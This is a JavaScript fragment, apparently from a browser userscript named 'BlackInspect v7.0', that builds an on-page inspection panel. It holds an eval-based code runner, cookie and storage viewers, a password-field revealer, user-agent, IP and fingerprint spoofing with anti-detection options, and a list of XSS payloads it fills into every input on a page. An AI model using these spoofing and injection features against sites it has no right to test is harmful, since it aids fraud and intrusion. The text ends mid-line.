    themeStyle.id = "bi-theme-vars";
    themeStyle.textContent = `#${BS} { --bi-bg: #0d1117; --bi-panel: #161b22; --bi-border: #30363d; --bi-text: #c9d1d9; --bi-sub: #8b949e; --bi-accent: #58a6ff; --bi-accentH: #1f6feb; }`;
    panel.appendChild(themeStyle);
    const st=D.createElement("style"); st.id="bi-panel-style"; st.textContent=`#${BS}{direction:${isRTL?"rtl":"ltr"}!important;unicode-bidi:isolate!important;}#${BS} *{direction:inherit;box-sizing:border-box;}#${BS} input,#${BS} textarea,#${BS} select{background:#161b22;color:#c9d1d9;border:1px solid #30363d;border-radius:6px;padding:6px 10px;width:100%;font-family:inherit;font-size:inherit;outline:none;transition:border-color .2s;}#${BS} input:focus,#${BS} textarea:focus,#${BS} select:focus{border-color:#58a6ff;}#${BS} button{cursor:pointer;border:none;border-radius:6px;padding:7px 14px;font-family:inherit;font-size:inherit;transition:opacity .15s,transform .1s;}#${BS} button:hover{opacity:.85;}#${BS} button:active{transform:scale(.97);}#${BS} h4{margin:8px 0 6px;color:#58a6ff;font-size:11px;text-transform:uppercase;letter-spacing:.06em;}#${BS} .bi-card{background:#161b22;padding:12px;border-radius:8px;margin-bottom:10px;border:1px solid #21262d;}#${BS} .bi-row{display:flex;gap:6px;align-items:center;margin-bottom:6px;}#${BS} .bi-grid2{display:grid;grid-template-columns:1fr 1fr;gap:8px;}#${BS} .bi-badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:10px;}#${BS} .bi-sep{border:none;border-top:1px solid #21262d;margin:8px 0;}#${BS} .bi-muted{color:#8b949e;font-size:11px;}#${BS} label{color:#8b949e;font-size:11px;display:block;margin-bottom:3px;}#${BS} .bi-scroll{overflow-y:auto;max-height:200px;}#${BS} .bi-code{background:#161b22;padding:8px;border-radius:6px;font-size:11px;color:#3fb950;white-space:pre-wrap;word-break:break-all;max-height:140px;overflow-y:auto;}#${BS} input[type=range]{padding:0;background:transparent;border:none;accent-color:#58a6ff;}#${BS} input[type=checkbox],#${BS} input[type=radio]{width:auto;display:inline;margin:0 4px 0 0;accent-color:#58a6ff;cursor:pointer;}#${BS} .bi-check-row{display:flex;align-items:center;gap:6px;margin-bottom:4px;}#${BS} .bi-check-row label{margin:0;color:#c9d1d9;cursor:pointer;}#${BS} .bi-tag{background:#21262d;border:1px solid #30363d;border-radius:4px;padding:2px 7px;font-size:10px;color:#8b949e;}#${BS} .bi-btn-green{background:#238636;color:#fff;}#${BS} .bi-btn-blue{background:#1f6feb;color:#fff;}#${BS} .bi-btn-red{background:#da3633;color:#fff;}#${BS} .bi-btn-orange{background:#c5862c;color:#fff;}#${BS} .bi-btn-dim{background:#21262d;color:#c9d1d9;border:1px solid #30363d;}#${BS} .bi-pass-entry{background:#161b22;border:1px solid #21262d;border-radius:8px;padding:10px 12px;margin-bottom:6px;display:flex;justify-content:space-between;align-items:center;gap:8px;}#${BS} .bi-todo-item{background:#161b22;border:1px solid #21262d;border-radius:8px;padding:10px 12px;margin-bottom:6px;}#${BS} .bi-empty{text-align:center;padding:32px 16px;color:#8b949e;font-size:12px;}#${BS} .bi-empty-icon{font-size:36px;display:block;margin-bottom:8px;}#${BS} .bi-status{font-size:11px;margin-top:6px;min-height:16px;}#${BS} .bi-ok{color:#3fb950;}#${BS} .bi-err{color:#f85149;}#${BS} .bi-warn{color:#d29922;}`; panel.appendChild(st);
    const fontSt=D.createElement("style"); fontSt.id="bi-font-style"; fontSt.textContent=`#${BS},#${BS} *{font-family:'${S.fontFamily}',Consolas,monospace!important;font-size:${S.fontSize}px!important;}`; panel.appendChild(fontSt);
    const header=D.createElement("div"); header.style.cssText=`background:#161b22;padding:10px 14px;cursor:move;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #21262d;user-select:none;flex-shrink:0;`; header.innerHTML=`<div style="display:flex;align-items:center;gap:10px;"><span style="color:#58a6ff;font-weight:700;font-size:14px;">⚙ BlackInspect</span><span style="color:#30363d;font-size:10px;">v7.0</span><span id="bi-kernel-dot" style="width:7px;height:7px;border-radius:50%;background:${S.kernelOnline?"#3fb950":"#f85149"};display:inline-block;" title="${S.kernelOnline?"Kernel online":"Kernel offline"}"></span></div><div style="display:flex;gap:10px;align-items:center;"><span id="bi-fps-hud" style="font-size:10px;color:#6a9955;min-width:50px;text-align:right;"></span><span id="bi-close" style="cursor:pointer;color:#8b949e;font-size:20px;line-height:1;padding:0 4px;" title="Close">×</span></div>`; panel.appendChild(header);
    const tabBar=D.createElement("div"); tabBar.style.cssText=`display:flex;background:#161b22;border-bottom:1px solid #21262d;overflow-x:auto;flex-shrink:0;padding:0 4px;scrollbar-width:none;`;
    const TABS=["Info","Vars","Inject","Spoof","Pass","Storage","Tools","Network","Security","PDF","Tasks","Settings"];
    TABS.forEach(name=>{ const btn=D.createElement("button"); btn.dataset.tab=name; btn.textContent=T(name); btn.style.cssText=`background:transparent;color:#8b949e;border:none;border-bottom:2px solid transparent;padding:8px 10px;cursor:pointer;font-family:inherit;font-size:11px;white-space:nowrap;flex-shrink:0;transition:color .15s;`; btn.addEventListener("click",()=>showTab(name)); tabBar.appendChild(btn); }); panel.appendChild(tabBar);
    const content=D.createElement("div"); content.id="bi-content"; content.style.cssText=`padding:12px;overflow-y:auto;flex:1;background:#0d1117;`; panel.appendChild(content);
    D.body.appendChild(panel);
    D.getElementById("bi-close").onclick=()=>{ panel.style.display="none"; };
    let dragging=false,dx=0,dy=0; header.addEventListener("mousedown",(e)=>{ dragging=true; dx=e.clientX-panel.offsetLeft; dy=e.clientY-panel.offsetTop; D.body.style.userSelect="none"; }); D.addEventListener("mousemove",(e)=>{ if(!dragging) return; panel.style.left=e.clientX-dx+"px"; panel.style.top=e.clientY-dy+"px"; S.panelLeft=e.clientX-dx; S.panelTop=e.clientY-dy; }); D.addEventListener("mouseup",()=>{ dragging=false; D.body.style.userSelect=""; S.panelWidth=panel.offsetWidth; S.panelHeight=panel.offsetHeight; });
    function showTab(tab){ [...tabBar.children].forEach(b=>{ const active=b.dataset.tab===tab; b.style.borderBottom=active?"2px solid #58a6ff":"2px solid transparent"; b.style.color=active?"#58a6ff":"#8b949e"; }); content.innerHTML=""; S.activeTab=tab; renderTab(tab); }
    function renderTab(tab){
      const c=content;
      if(tab==="Info"){
        c.innerHTML=`<div style="color:#58a6ff;font-weight:700;margin-bottom:4px;font-size:13px;">🌐 <span id="inf-title"></span></div><div class="bi-muted" style="word-break:break-all;margin-bottom:10px;" id="inf-url"></div><div class="bi-card" id="inf-net"></div><div class="bi-card" id="inf-page"></div><div class="bi-card"><h4>📋 Response Headers</h4><div id="inf-rh" class="bi-muted bi-scroll" style="font-size:11px;"></div></div>`;
        D.getElementById("inf-title").textContent=D.title; D.getElementById("inf-url").textContent=location.href;
        (async()=>{ const nav=performance.getEntriesByType("navigation")[0]; D.getElementById("inf-net").innerHTML=`<h4>📡 Network</h4><div>🖥 Server: <span id="srv" style="color:#58a6ff;">…</span></div><div>📡 IP: <span id="pgip" style="color:#58a6ff;">…</span></div><div>🔒 Protocol: ${nav?.nextHopProtocol||"N/A"}</div>`; D.getElementById("inf-page").innerHTML=`<h4>📄 Page</h4><div>📝 Desc: ${D.querySelector('meta[name="description"]')?.content||"—"}</div><div>🌐 Charset: ${D.characterSet}</div><div>📱 Viewport: ${D.querySelector('meta[name="viewport"]')?.content||"—"}</div><div style="margin-top:4px;">🔗 ${D.links.length} links &nbsp; 🖼 ${D.images.length} imgs &nbsp; 📜 ${D.scripts.length} scripts &nbsp; 🎨 ${D.styleSheets.length} css &nbsp; 📋 ${D.forms.length} forms &nbsp; 🗂 ${D.querySelectorAll("*").length} nodes</div><div>💾 Size: ${(new Blob([D.documentElement.outerHTML]).size/1024).toFixed(1)} KB &nbsp; ⏱ Load: ${performance.timing.loadEventEnd-performance.timing.navigationStart}ms</div>`; try{ const r=await fetch(location.href,{method:"HEAD"}); D.getElementById("srv").textContent=r.headers.get("Server")||"—"; let rh=""; r.headers.forEach((v,k)=>rh+=`<span style="color:#58a6ff;">${k}</span>: ${v}<br>`); D.getElementById("inf-rh").innerHTML=rh||'<span class="bi-muted">No headers</span>'; }catch(e){ D.getElementById("srv").textContent="Error"; } try{ const r2=await fetch(`https://dns.google/resolve?name=${location.hostname}&type=A`); const d=await r2.json(); D.getElementById("pgip").textContent=d.Answer?.[0]?.data||"N/A"; }catch(e){ D.getElementById("pgip").textContent="Error"; } })();
      } else if(tab==="Vars"){
        c.innerHTML=`<div class="bi-row"><input id="varFilter" placeholder="${T("Filter...")}" style="flex:1;"><button id="scanVars" class="bi-btn-blue">🔄 ${T("Scan")}</button><button id="exportVars" class="bi-btn-dim">💾 ${T("Export")}</button></div><div id="varList" class="bi-scroll" style="max-height:380px;font-size:11px;background:#161b22;padding:8px;border-radius:6px;"></div>`;
        const getBase=()=>{ const ifr=D.createElement("iframe"); ifr.src="about:blank"; D.body.appendChild(ifr); const k=Object.keys(ifr.contentWindow||{}); ifr.remove(); return k; }; const base=getBase(); const scan=()=>{ const lst=D.getElementById("varList"); lst.innerHTML="⏳"; const filter=D.getElementById("varFilter").value.toLowerCase(); const keys=Object.keys(W).filter(k=>!base.includes(k)).filter(k=>!filter||k.toLowerCase().includes(filter)).sort(); if(!keys.length){ lst.innerHTML='<span class="bi-muted">No variables found.</span>'; return; } lst.innerHTML=keys.map(k=>{ const v=W[k],t=typeof v; let d=""; try{ d=t==="function"?"ƒ()":t==="object"&&v?JSON.stringify(v).substring(0,80)+"…":t==="string"?`"${v.substring(0,60)}"`:String(v).substring(0,60); }catch(e){ d="(err)"; } return `<div style="margin-bottom:3px;cursor:pointer;padding:2px 4px;border-radius:3px;" onmouseenter="this.style.background='#21262d'" onmouseleave="this.style.background='transparent'" onclick="var v=prompt('New value for ${k}:',String(window['${k}']||''));if(v!==null){try{eval('window.${k}='+v);}catch(e){window['${k}']=v;}}"><span style="color:#9cdcfe;">${k}</span> <span style="color:#6a9955;">(${t})</span> = <span style="color:#ce9178;">${d}</span></div>`; }).join(""); }; D.getElementById("scanVars").onclick=scan; D.getElementById("varFilter").oninput=scan; D.getElementById("exportVars").onclick=()=>{ const d=Object.keys(W).filter(k=>!base.includes(k)).reduce((a,k)=>{ try{ a[k]=W[k]; }catch(e){} return a; },{}); dlBlob(new Blob([JSON.stringify(d,null,2)],{type:"application/json"}),"variables.json"); }; scan();
      } else if(tab==="Inject"){
        c.innerHTML=`<div class="bi-card"><h4>▶ Run Code</h4><textarea id="codeInj" style="height:150px;resize:vertical;font-family:inherit;" placeholder="// JavaScript code here..."></textarea><button id="runCode" class="bi-btn-orange" style="width:100%;margin-top:6px;">▶ Run</button><div id="injOut" class="bi-code" style="margin-top:8px;"></div></div>`;
        D.getElementById("runCode").onclick=()=>{ const code=D.getElementById("codeInj").value; const out=D.getElementById("injOut"); try{ out.textContent="✅ Return: "+String(eval(code)); }catch(e){ out.textContent="❌ "+e.message; out.style.color="#f85149"; } };
      } else if(tab==="Spoof"){
        const tpls={ chrome_win:{ ua:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36", plat:"Win32", lang:"en-US" }, firefox_linux:{ ua:"Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0", plat:"Linux x86_64", lang:"en-US" }, safari_mac:{ ua:"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15", plat:"MacIntel", lang:"en-US" }, edge_win:{ ua:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0", plat:"Win32", lang:"en-US" }, iphone:{ ua:"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.4 Mobile/15E148 Safari/604.1", plat:"iPhone", lang:"en-US" }, android:{ ua:"Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 Chrome/126.0.6478.122 Mobile Safari/537.36", plat:"Linux armv8l", lang:"en-US" } };
        c.innerHTML=`<div class="bi-grid2"><div><div class="bi-card"><h4>📡 Identity Spoof</h4><label>Template</label><select id="tpl" style="margin-bottom:8px;"><option value="">— Custom —</option><option value="chrome_win">Chrome / Windows</option><option value="firefox_linux">Firefox / Linux</option><option value="safari_mac">Safari / macOS</option><option value="edge_win">Edge / Windows</option><option value="iphone">iPhone Safari</option><option value="android">Android Chrome</option></select><label>${T("Fake IP")}</label><div class="bi-row"><input id="fakeIP" value="${S.ip}" style="flex:1;"><button id="randIP" class="bi-btn-dim" style="flex-shrink:0;">🎲</button></div><label>${T("User-Agent")}</label><input id="ua" value="${S.ua}" style="margin-bottom:6px;"><label>${T("Platform")}</label><input id="plat" value="${S.platform}" style="margin-bottom:6px;"><label>${T("Language")}</label><input id="lang" value="${S.language}" style="margin-bottom:8px;"><div class="bi-check-row"><input type="checkbox" id="bos" ${S.breakOnStart?"checked":""}><label for="bos">${T("Break on load")}</label></div><div class="bi-row" style="margin-top:8px;"><button id="startSpoof" class="bi-btn-blue" style="flex:1;">▶ ${T("Start Spoofing")}</button><button id="stopSpoof" class="bi-btn-red" style="flex:1;" ${S.spoofActive?"":"disabled"}>⏹ ${T("Stop Spoofing")}</button></div><div id="spoofStatus" class="bi-status ${S.spoofActive?"bi-ok":""}">${S.spoofActive?"✅ "+T("Spoofing active"):""}</div></div></div><div><div class="bi-card"><h4>🛡 Anti-Detection</h4><div class="bi-check-row"><input type="checkbox" id="cvToggle" ${S.canvasSpoof?"checked":""}><label for="cvToggle">${T("Canvas Spoof")}</label></div><div class="bi-check-row"><input type="checkbox" id="tvToggle" ${S.tabVisSpoof?"checked":""}><label for="tvToggle">${T("Tab Visibility")}</label></div><div class="bi-check-row"><input type="checkbox" id="heToggle" ${S.hideExt?"checked":""}><label for="heToggle">${T("Hide Extensions")}</label></div><div class="bi-check-row"><input type="checkbox" id="biToggle" ${S.spoofBuildID?"checked":""}><label for="biToggle">${T("Spoof BuildID")}</label></div><div class="bi-check-row"><input type="checkbox" id="vmToggle" ${S.antiVM?"checked":""}><label for="vmToggle">${T("Anti-VM")}</label></div><div class="bi-muted" style="margin-top:6px;">Changes apply on next page load</div></div><div class="bi-card" style="margin-top:0;"><h4>💾 Profile</h4><button id="exportCfg" class="bi-btn-blue" style="width:100%;margin-bottom:4px;">📥 Export Profile</button><button id="importCfg" class="bi-btn-dim" style="width:100%;margin-bottom:4px;">📤 Import Profile</button><input type="file" id="importFile" style="display:none" accept=".json"><div id="cfgStatus" class="bi-status"></div></div></div></div>`;
        D.getElementById("tpl").onchange=function(){ const t=tpls[this.value]; if(t){ D.getElementById("ua").value=t.ua; D.getElementById("plat").value=t.plat; D.getElementById("lang").value=t.lang; } }; D.getElementById("randIP").onclick=()=>(D.getElementById("fakeIP").value=Array.from({length:4},()=>Math.floor(Math.random()*256)).join(".")); D.getElementById("startSpoof").onclick=()=>{ const ip=D.getElementById("fakeIP").value.trim(), ua=D.getElementById("ua").value.trim(), plat=D.getElementById("plat").value.trim(), lang=D.getElementById("lang").value.trim(); if(!ip&&!ua&&!plat&&!lang){ D.getElementById("spoofStatus").textContent="⚠ Fill at least one field."; return; } S.spoofActive=true; S.ip=ip; S.ua=ua; S.platform=plat; S.language=lang; S.breakOnStart=D.getElementById("bos").checked; applySpoofing(ip,ua,plat,lang); D.getElementById("spoofStatus").className="bi-status bi-ok"; D.getElementById("spoofStatus").textContent="✅ "+T("Spoofing active"); D.getElementById("startSpoof").disabled=true; D.getElementById("stopSpoof").disabled=false; }; D.getElementById("stopSpoof").onclick=()=>{ S.spoofActive=false; D.getElementById("spoofStatus").className="bi-status bi-muted"; D.getElementById("spoofStatus").textContent="⏹ Stopped (reload to fully restore)"; D.getElementById("startSpoof").disabled=false; D.getElementById("stopSpoof").disabled=true; }; D.getElementById("exportCfg").onclick=()=>{ const d={ ip:S.ip, ua:S.ua, platform:S.platform, language:S.language, breakOnStart:S.breakOnStart }; dlBlob(new Blob([JSON.stringify(d,null,2)],{type:"application/json"}),S.profileFile); D.getElementById("cfgStatus").textContent="✅ Exported."; }; D.getElementById("importCfg").onclick=()=>D.getElementById("importFile").click(); D.getElementById("importFile").onchange=(e)=>{ const f=e.target.files[0]; if(!f) return; const r=new FileReader(); r.onload=(ev)=>{ try{ const d=JSON.parse(ev.target.result); D.getElementById("fakeIP").value=d.ip||""; D.getElementById("ua").value=d.ua||""; D.getElementById("plat").value=d.platform||""; D.getElementById("lang").value=d.language||""; D.getElementById("cfgStatus").textContent="✅ Profile loaded."; }catch(ex){ D.getElementById("cfgStatus").textContent="❌ Invalid file."; } }; r.readAsText(f); }; ["cvToggle","tvToggle","heToggle","biToggle","vmToggle"].forEach((id,i)=>{ const keys=["canvasSpoof","tabVisSpoof","hideExt","spoofBuildID","antiVM"]; const fns=[applyCanvasSpoof,applyTabVisSpoof,applyHideExt,applyBuildIDSpoof,applyAntiVM]; D.getElementById(id).onchange=function(){ S[keys[i]]=this.checked; if(this.checked) fns[i](); }; });
      } else if(tab==="Pass"){
        // REPLACED WITH PATCH MODULE
        biRenderPassTab(c);
      } else if(tab==="Storage"){
        c.innerHTML=`<div class="bi-grid2"><div><div class="bi-card"><h4>🍪 ${T("Cookies")}</h4><button id="viewCookies" class="bi-btn-dim" style="width:100%;margin-bottom:6px;">View Cookies</button><div id="cookieView" class="bi-scroll bi-code" style="max-height:180px;font-size:11px;"></div></div><div class="bi-card"><h4>📦 ${T("LocalStorage")}</h4><button id="viewLS" class="bi-btn-dim" style="width:100%;margin-bottom:6px;">View LocalStorage</button><div id="lsView" class="bi-scroll bi-code" style="max-height:180px;font-size:11px;"></div></div></div><div><div class="bi-card"><h4>📦 ${T("SessionStorage")}</h4><button id="viewSS" class="bi-btn-dim" style="width:100%;margin-bottom:6px;">View SessionStorage</button><div id="ssView" class="bi-scroll bi-code" style="max-height:120px;font-size:11px;"></div></div><div class="bi-card"><h4>✏️ Set Value</h4><label>Key</label><input id="storKey" placeholder="key" style="margin-bottom:4px;"><label>Value</label><input id="storVal" placeholder="value" style="margin-bottom:8px;"><div class="bi-grid2" style="gap:4px;"><button id="setCookie" class="bi-btn-dim">🍪 Cookie</button><button id="setLS" class="bi-btn-dim">📦 LocalStorage</button></div><div id="storOut" class="bi-status bi-ok"></div></div></div></div>`;
        D.getElementById("viewCookies").onclick=()=>{ const entries=D.cookie.split(";").map(c=>{ const [k,...v]=c.trim().split("="); return `<div style="border-bottom:1px solid #21262d;padding:4px 0;"><span style="color:#9cdcfe;">${k.trim()}</span> = <span style="color:#ce9178;">${v.join("=").trim()}</span></div>`; }); D.getElementById("cookieView").innerHTML=entries.join("")||`<span class="bi-muted">${T("No cookies")}</span>`; }; D.getElementById("viewLS").onclick=()=>{ let h=""; try{ for(let i=0;i<localStorage.length;i++){ const k=localStorage.key(i); h+=`<div style="border-bottom:1px solid #21262d;padding:4px 0;"><span style="color:#9cdcfe;">${k}</span> = <span style="color:#ce9178;">${(localStorage.getItem(k)||"").substring(0,200)}</span></div>`; } }catch(e){} D.getElementById("lsView").innerHTML=h||`<span class="bi-muted">Empty</span>`; }; D.getElementById("viewSS").onclick=()=>{ let h=""; try{ for(let i=0;i<sessionStorage.length;i++){ const k=sessionStorage.key(i); h+=`<div style="border-bottom:1px solid #21262d;padding:4px 0;"><span style="color:#9cdcfe;">${k}</span> = <span style="color:#ce9178;">${(sessionStorage.getItem(k)||"").substring(0,200)}</span></div>`; } }catch(e){} D.getElementById("ssView").innerHTML=h||`<span class="bi-muted">Empty</span>`; }; D.getElementById("setCookie").onclick=()=>{ const k=D.getElementById("storKey").value.trim(), v=D.getElementById("storVal").value; if(!k) return; D.cookie=`${k}=${encodeURIComponent(v)};path=/;SameSite=Lax`; D.getElementById("storOut").textContent=`✅ Cookie set: ${k}`; }; D.getElementById("setLS").onclick=()=>{ const k=D.getElementById("storKey").value.trim(), v=D.getElementById("storVal").value; if(!k) return; try{ localStorage.setItem(k,v); D.getElementById("storOut").textContent=`✅ LocalStorage set: ${k}`; }catch(e){ D.getElementById("storOut").textContent="❌ "+e.message; } };
      } else if(tab==="Tools"){
        c.innerHTML=`<div class="bi-grid2"><div><div class="bi-card"><h4>🔓 Restrictions</h4><button id="breakBtn" style="width:100%;margin-bottom:4px;${restrictionsBroken?"background:#238636":"background:#da3633"};color:#fff;">${restrictionsBroken?"🔄 "+T("Restore Restrictions"):"🔓 "+T("Break Restrictions")}</button><div id="brkOpts" style="display:${restrictionsBroken?"none":"block"};"><div class="bi-check-row"><input type="checkbox" id="brkCtx" checked><label for="brkCtx">Context menu</label></div><div class="bi-check-row"><input type="checkbox" id="brkCopy" checked><label for="brkCopy">Copy</label></div><div class="bi-check-row"><input type="checkbox" id="brkPaste" checked><label for="brkPaste">Paste</label></div><div class="bi-check-row"><input type="checkbox" id="brkSel" checked><label for="brkSel">Selectstart</label></div><div class="bi-check-row"><input type="checkbox" id="brkDrag" checked><label for="brkDrag">Drag</label></div><button id="doBreak" class="bi-btn-red" style="width:100%;margin-top:8px;">Apply</button></div><div id="brkStatus" class="bi-status ${restrictionsBroken?"bi-ok":""}"></div></div><div class="bi-card"><h4>💉 XSS Inject (Debug)</h4><select id="xssPayload" style="margin-bottom:6px;"><option value='<script>alert(1)<\/script>'>&lt;script&gt;alert(1)&lt;/script&gt;</option><option value='"><img src=x onerror=alert(1)>'>&gt;&lt;img onerror&gt;</option><option value="'><svg/onload=alert(1)>">&gt;&lt;svg onload&gt;</option><option value='<details open ontoggle=alert(1)>'>&lt;details ontoggle&gt;</option><option value='<input onfocus=alert(1) autofocus>'>&lt;input autofocus&gt;</option></select><button id="injectXSS" class="bi-btn-orange" style="width:100%;">💉 Inject to inputs</button><div id="xssOut" class="bi-status"></div></div></div><div><div class="bi-card"><h4>⚡ Quick Actions</h4><div class="bi-grid2" style="gap:4px;"><button id="bdown"  class="bi-btn-blue">📦 Download Page</button><button id="cpText" class="bi-btn-dim">📋 Copy Text</button><button id="ssBtn"  class="bi-btn-dim">📸 Screenshot</button><button id="shPW"   class="bi-btn-dim">👁 Show Passwords</button><button id="stopLoadBtn" class="bi-btn-dim">⏹ Stop Loading</button><button id="reloadBtn"  class="bi-btn-dim">🔄 Reload</button><button id="resetPosBtn" class="bi-btn-dim">📐 Reset Panel</button><button id="popupBtn"   class="bi-btn-dim">🪟 Popup Panel</button></div><div id="toolsOut" class="bi-status bi-ok"></div></div><div class="bi-card"><h4>🖥 ${T("Split AI")}</h4><select id="aiSvc" style="margin-bottom:6px;"><option value="">— Select AI —</option><option value="chatgpt">ChatGPT</option><option value="deepseek">DeepSeek</option><option value="gemini">Gemini</option><option value="claude">Claude</option><option value="kimi">Kimi</option><option value="grok">Grok</option></select><button id="openSplit" class="bi-btn-blue" style="width:100%;">🖥 Open Split</button></div></div></div>`;
        // Add fake data section (moved from Pass tab)
        const fakeDiv = D.createElement("div");
        fakeDiv.className = "bi-card";
        fakeDiv.innerHTML = `<h4>👤 Fake Data</h4><div class="bi-grid2" style="gap:4px;"><button id="fillName" class="bi-btn-dim">👤 Name</button><button id="fillEmail" class="bi-btn-dim">📧 Email</button><button id="fillPhone" class="bi-btn-dim">📞 Phone</button><button id="fillAll" class="bi-btn-blue">⚡ Fill All</button></div><div id="fakeOut" class="bi-status bi-ok"></div>`;
        c.querySelector('.bi-grid2 > div:last-child').appendChild(fakeDiv);
        const tout=D.getElementById("toolsOut");
        D.getElementById("breakBtn").onclick=()=>{ if(restrictionsBroken){ location.reload(); }else{ const o=D.getElementById("brkOpts"); o.style.display=o.style.display==="none"?"block":"none"; } }; D.getElementById("doBreak").onclick=()=>{ const opts={ contextmenu:D.getElementById("brkCtx").checked, copy:D.getElementById("brkCopy").checked, paste:D.getElementById("brkPaste").checked, selectstart:D.getElementById("brkSel").checked, dragstart:D.getElementById("brkDrag").checked, mousedown:true }; S.breakOptions=opts; breakRestrictions(opts); restrictionsBroken=true; D.getElementById("breakBtn").style.background="#238636"; D.getElementById("breakBtn").textContent="🔄 "+T("Restore Restrictions"); D.getElementById("brkOpts").style.display="none"; D.getElementById("brkStatus").className="bi-status bi-ok"; D.getElementById("brkStatus").textContent="✅ Restrictions broken."; }; D.getElementById("injectXSS").onclick=()=>{ const p=D.getElementById("xssPayload").value; const inps=D.querySelectorAll("input[type=text],input:not([type]),textarea"); inps.forEach(i=>{ i.value=p; i.dispatchEvent(new Event("input",{bubbles:true})); }); D.getElementById("xssOut").className="bi-status bi-ok"; D.getElementById("xssOut").textContent=`✅ Injected into ${inps.length} fields.`; }; D.getElementById("bdown").onclick=async()=>{ tout.textContent="⏳ Collecting..."; const cl=D.documentElement.cloneNode(true); dlBlob(new Blob(["<!DOCTYPE html>\n"+cl.outerHTML],{type:"text/html"}),D.title.replace(/[^a-z0-9]/gi,"_")+"_fullpage.html"); tout.textContent="✅ Downloaded!"; }; D.getElementById("cpText").onclick=()=>{ breakRestrictions(); const walker=D.createTreeWalker(D.body,NodeFilter.SHOW_TEXT,{ acceptNode:(n)=>n.parentNode.closest("#"+BS)?NodeFilter.FILTER_REJECT:NodeFilter.FILTER_ACCEPT }); let text=""; while(walker.nextNode()) text+=walker.currentNode.nodeValue; N.clipboard?.writeText(text).then(()=>{ tout.textContent=`✅ Copied ${text.length} chars.`; }); }; D.getElementById("ssBtn").onclick=()=>{ tout.textContent="📸 Capturing..."; takeScreenshot().then(()=>tout.textContent="✅ Screenshot saved."); }; D.getElementById("shPW").onclick=()=>{ const inps=D.querySelectorAll("input[type=password]"); inps.forEach(i=>i.type="text"); tout.textContent=`✅ ${inps.length} fields revealed.`; }; let stopped=false; D.getElementById("stopLoadBtn").onclick=()=>{ if(!stopped){ W.stop(); stopped=true; D.getElementById("stopLoadBtn").textContent="▶ Resume"; }else{ location.reload(); } }; D.getElementById("reloadBtn").onclick=()=>location.reload(); D.getElementById("resetPosBtn").onclick=resetPanelPos; D.getElementById("popupBtn").onclick=()=>{ const w=window.open("","BiPopup","width=900,height=600,resizable=yes"); if(!w){ tout.textContent="❌ Popup blocked."; return; } w.document.write(`<!DOCTYPE html><html><head><title>BlackInspect</title><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css"><style>body{margin:0;background:#0d1117;color:#c9d1d9;font-family:'Vazirmatn','IBM Plex Mono',monospace;padding:20px;}</style></head><body><h2 style="color:#58a6ff;">⚙ BlackInspect v7.0</h2><textarea style="width:100%;height:80%;background:#161b22;color:#c9d1d9;border:1px solid #30363d;padding:10px;font-family:inherit;border-radius:8px;" placeholder="Quick notes..."></textarea></body></html>`); tout.textContent="✅ Popup opened."; }; const aiUrls={ chatgpt:"https://chat.openai.com", deepseek:"https://chat.deepseek.com", gemini:"https://gemini.google.com", claude:"https://claude.ai", kimi:"https://kimi.moonshot.cn", grok:"https://grok.x.ai" }; D.getElementById("openSplit").onclick=()=>{ const svc=D.getElementById("aiSvc").value; if(!svc) return; const url=aiUrls[svc]; const pw=Math.floor(W.innerWidth/2), ph=W.innerHeight; const px=W.screenX+(W.outerWidth-pw), py=W.screenY; const popup=window.open(url,"_blank",`width=${pw},height=${ph},left=${px},top=${py}`); tout.textContent=popup?`✅ ${svc} opened.`:"❌ Popup blocked."; };
        // fake data functions
        const fnames = ["Ali","Sara","Reza","Maryam","Mohammad","Fatemeh"];
        const emails = ["test@example.com","user@mail.com","info@site.org"];
        const phones = ["09123456789","09351234567","09187654321"];
        const rnd = (a) => a[Math.floor(Math.random()*a.length)];
        const fillAttr = (attr, val) => { let c=0; D.querySelectorAll("input:not([type=hidden])").forEach(inp=>{ const n=((inp.name||"")+" "+(inp.id||"")+" "+(inp.placeholder||"")).toLowerCase(); if(n.includes(attr)){ inp.value=val; inp.dispatchEvent(new Event("input",{bubbles:true})); c++; } }); return c; };
        D.getElementById("fillName").onclick=()=>{ fillAttr("name",rnd(fnames)); D.getElementById("fakeOut").textContent="✅ Name filled."; };
        D.getElementById("fillEmail").onclick=()=>{ fillAttr("email",rnd(emails)); D.getElementById("fakeOut").textContent="✅ Email filled."; };
        D.getElementById("fillPhone").onclick=()=>{ fillAttr("phone",rnd(phones)); fillAttr("mobile",rnd(phones)); D.getElementById("fakeOut").textContent="✅ Phone filled."; };
        D.getElementById("fillAll").onclick=()=>{ let c=fillAttr("name",rnd(fnames))+fillAttr("email",rnd(emails))+fillAttr("phone",rnd(phones)); D.getElementById("fakeOut").textContent=`✅ ${c} fields filled.`; };
      } else if(tab==="Network"){
        c.innerHTML=`<div class="bi-grid2"><div><div class="bi-card"><h4>🔑 ${T("Auth Injection")}</h4><label>${T("Header Name")}</label><input id="authHN" value="${S.authHName}" style="margin-bottom:4px;"><label>${T("Token Value")}</label><input id="authHV" value="${S.authHVal}" placeholder="Bearer eyJ..." style="margin-bottom:8px;"><div class="bi-row"><button id="startAuth" class="bi-btn-blue" style="flex:1;">▶ Inject</button><button id="stopAuth" class="bi-btn-red" style="flex:1;">⏹ Stop</button></div><div id="authStatus" class="bi-status ${S.authActive?"bi-ok":""}">${S.authActive?"✅ Injection active":""}</div></div><div class="bi-card"><h4>🚫 ${T("Prevent Preflight")}</h4><div class="bi-check-row"><input type="checkbox" id="prefToggle" ${S.preventPre?"checked":""}><label for="prefToggle">${T("Prevent Preflight")}</label></div><div class="bi-muted">Strips non-simple headers to avoid CORS preflight requests.</div><div id="prefStatus" class="bi-status ${S.preventPre?"bi-ok":""}"></div></div></div><div><div class="bi-card"><h4>🔒 ${T("SSL Headers")}</h4><button id="analyzeHdrs" class="bi-btn-blue" style="width:100%;margin-bottom:8px;">🔍 